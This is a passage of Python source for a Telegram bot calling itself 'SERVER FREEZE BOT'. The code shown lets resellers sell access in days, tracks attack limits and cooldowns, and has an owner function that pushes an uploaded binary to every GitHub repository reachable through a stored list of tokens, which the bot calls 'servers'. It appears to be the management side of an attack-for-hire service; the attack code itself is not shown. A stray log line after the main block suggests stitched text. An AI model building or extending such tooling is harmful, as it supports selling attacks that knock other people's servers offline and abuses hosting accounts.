            
            await update.message.reply_text(
                f"✅ **CREDITS ADDED!**\n\n"
                f"🆔 Reseller: {reseller_id}\n"
                f"➕ Added: {credits} days\n"
                f"💳 New Total: {resellers[reseller_id]['credits']} days",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
    
    elif state == "reseller_add_user_id":
        try:
            target_user_id = str(int(text))
            user_states[user_id]["data"]["target_id"] = target_user_id
            user_states[user_id]["state"] = "reseller_add_user_days"
            
            await update.message.reply_text(
                "📅 **ENTER DAYS**\n\nHow many days of access?",
                reply_markup=get_cancel_keyboard()
            )
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())
    
    elif state == "reseller_add_user_days":
        try:
            days = int(text)
            if days < 1:
                await update.message.reply_text("⚠️ Days must be at least 1!", reply_markup=get_cancel_keyboard())
                return
            
            reseller_data = resellers[str(user_id)]
            if reseller_data.get('credits', 0) < days:
                await update.message.reply_text(
                    f"❌ **INSUFFICIENT CREDITS!**\n\n"
                    f"You have: {reseller_data.get('credits', 0)} days\n"
                    f"Required: {days} days",
                    reply_markup=get_back_keyboard()
                )
                user_states[user_id] = None
                return
            
            target_user_id = state_info["data"]["target_id"]
            expiry = datetime.now() + timedelta(days=days)
            
            approved_users[target_user_id] = {
                "username": f"user_{target_user_id}",
                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "plan": f"{days} days"
            }
            
            resellers[str(user_id)]["credits"] -= days
            resellers[str(user_id)]["users_added"] = resellers[str(user_id)].get("users_added", 0) + 1
            
            save_approved_users(approved_users)
            save_resellers(resellers)
            
            await update.message.reply_text(
                f"✅ **USER ADDED!**\n\n"
                f"👤 User: {target_user_id}\n"
                f"📅 Days: {days}\n"
                f"💳 Credits Left: {resellers[str(user_id)]['credits']} days",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number!", reply_markup=get_cancel_keyboard())
    
    elif state == "reseller_remove_user_id":
        try:
            target_user_id = str(int(text))
            
            if target_user_id not in approved_users:
                await update.message.reply_text("❌ User not found!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            if approved_users[target_user_id].get('added_by') != str(user_id):
                await update.message.reply_text("❌ You can only remove users you added!", reply_markup=get_back_keyboard())
                user_states[user_id] = None
                return
            
            del approved_users[target_user_id]
            save_approved_users(approved_users)
            
            await update.message.reply_text(
                f"✅ **USER REMOVED!**\n\n"
                f"🆔 ID: {target_user_id}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text("⚠️ Invalid ID!", reply_markup=get_cancel_keyboard())

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    state = state_info.get("state")
    
    if state == WAITING_FOR_BINARY:
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            user_states[user_id] = None
            return
        
        progress_msg = await update.message.reply_text("📥 Downloading binary file...")
        
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)
            
            with open(file_path, 'rb') as f:
                binary_content = f.read()
            
            file_size = len(binary_content)
            
            await progress_msg.edit_text(
                f"📊 Downloaded: {file_size} bytes\n\n"
                f"📤 Uploading to {len(github_tokens)} servers..."
            )
            
            success_count = 0
            results = []
            
            def upload_to_repo(token_data):
                try:
                    g = Github(token_data['token'])
                    repo = g.get_repo(token_data['repo'])
                    
                    try:
                        existing_file = repo.get_contents(BINARY_FILE_NAME)
                        repo.update_file(
                            BINARY_FILE_NAME,
                            "Update binary file",
                            binary_content,
                            existing_file.sha,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                    except:
                        repo.create_file(
                            BINARY_FILE_NAME,
                            "Upload binary file",
                            binary_content,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                except Exception as e:
                    results.append((token_data['username'], False))
            
            threads = []
            for token_data in github_tokens:
                thread = threading.Thread(target=upload_to_repo, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            for username, success in results:
                if success:
                    success_count += 1
            
            os.remove(file_path)
            
            await progress_msg.edit_text(
                f"✅ **UPLOAD COMPLETED!**\n\n"
                f"✅ Successful: {success_count}\n"
                f"❌ Failed: {len(github_tokens) - success_count}\n"
                f"📊 Total: {len(github_tokens)}\n\n"
                f"📁 File: {BINARY_FILE_NAME}\n"
                f"📦 Size: {file_size} bytes",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except Exception as e:
            await progress_msg.edit_text(
                f"❌ **ERROR**\n\n{str(e)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("=" * 50)
    print("🤖 SERVER FREEZE BOT STARTED")
    print("=" * 50)
    print(f"👑 Owners: {len(owners)}")
    print(f"🛡️ Admins: {len(admins)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"👥 Users: {len(approved_users)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"📝 Pending: {len(load_pending_users())}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max Attacks: {MAX_ATTACKS}")
    print("=" * 50)
    
    application.run_polling()

if __name__ == '__main__':
    main()

logger.info("✅ Part 6: Message handlers and ")
